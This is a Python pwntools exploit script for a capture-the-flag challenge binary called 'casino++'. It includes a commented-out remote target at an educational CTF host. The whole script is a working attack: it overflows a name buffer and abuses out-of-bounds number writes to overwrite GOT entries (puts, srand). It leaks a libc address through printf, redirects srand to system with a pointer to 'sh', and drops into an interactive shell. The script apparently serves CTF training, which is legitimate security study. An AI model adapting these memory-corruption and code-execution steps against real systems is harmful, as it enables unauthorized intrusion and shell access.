from pwn import *

context.arch = 'amd64'

guess = [0x06, 0x20, 0x00, 0x2a, 0x1e, 0x5f]

sh = asm(shellcraft.amd64.sh())
offset_name_to_seed = 0x602100 - 0x6020f0
offset_seed_to_sh = 0x602110 - 0x602100 - 0x04

def casinoLoop(which, lhalf, rhalf):
    for i in range(6):
        r.sendlineafter("Chose the number {}: ".format(i), "87")

    r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
    r.sendlineafter("Which number [1 ~ 6]: ", str(which))
    r.sendlineafter("Chose the number {}: ".format(which - 1), str(rhalf)) # replace puts@libc to casino()

    for i in range(6):
        r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

    r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
    r.sendlineafter("Which number [1 ~ 6]: ", str(which + 1))
    r.sendlineafter("Chose the number {}: ".format(which), str(lhalf))


r = process('./casino++', env={"LD_PRELOAD" : "./libc.so"})
# r = remote('edu-ctf.csie.org', 10176)
# r = remote('127.0.0.1', 8888)
pause()

r.sendlineafter("Your name:", b'a' * offset_name_to_seed + p32(0x602030) + b'b' * offset_seed_to_sh + 'sh')
r.sendlineafter("Your age:", '22')

################################################ change puts to casino()
offset_from_guess_to_putsgot = int((0x6020d0 - 0x602020) / 4)
casinoLoop(-offset_from_guess_to_putsgot + 1, 0, 0x40095d)

################################################# change srand to printf
offset_from_guess_to_srandgot = int((0x6020d0 - 0x602040) / 4)
casinoLoop(-offset_from_guess_to_srandgot + 1, 0, 0x400700)

################################################## leak glibc addr
# r.interactive()
printf_libc = u64(r.recv(6) + '\0\0')
success("printf@glibc leak addr: {:x}".format(printf_libc))

################################################ change seed to sh
success("changing seed to sh")
guess = [0x11, 0x42, 0x4f, 0x39, 0x4f, 0x35]
sh = 0x602110
for i in range(6):
    r.sendlineafter("Chose the number {}: ".format(i), "87")

r.sendlineafter("Change the number? [1:yes 0:no]: ", '0')

for i in range(6):
    r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

offset_from_guess_to_seed = int((0x602100 - 0x6020d0) / 4 + 1)
r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
r.sendlineafter("Which number [1 ~ 6]: ", str(offset_from_guess_to_seed))
r.sendlineafter("Chose the number {}: ".format(offset_from_guess_to_seed - 1), str(sh)) # replace seed with addr of sh

success("changing seed to sh fin")

################################################# change srand to system
##printf@glibc -> 0x64e80
##system@glibc -> 0x4f440
offset_from_printf_to_system = 0x4f440 - 0x64e80
system_libc = printf_libc + offset_from_printf_to_system
system_libc_right = system_libc & 0xffffffff
system_libc_left = system_libc >> 32
success("changing srand to system@libc: {:x}".format(system_libc))
guess = [0x0f, 0x4c, 0x2d, 0x37, 0x3e, 0x05]
for i in range(6):
    r.sendlineafter("Chose the number {}: ".format(i), "87")

r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot + 1))
r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot), str(system_libc_right)) # replace puts@libc to casino()

for i in range(6):
    r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
# r.recvuntil("Change the number? [1:yes 0:no]: ")
r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot + 2))
r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot + 1), str(system_libc_left)) # replace srand with system@libc
success("changed srand to system")



r.interactive()



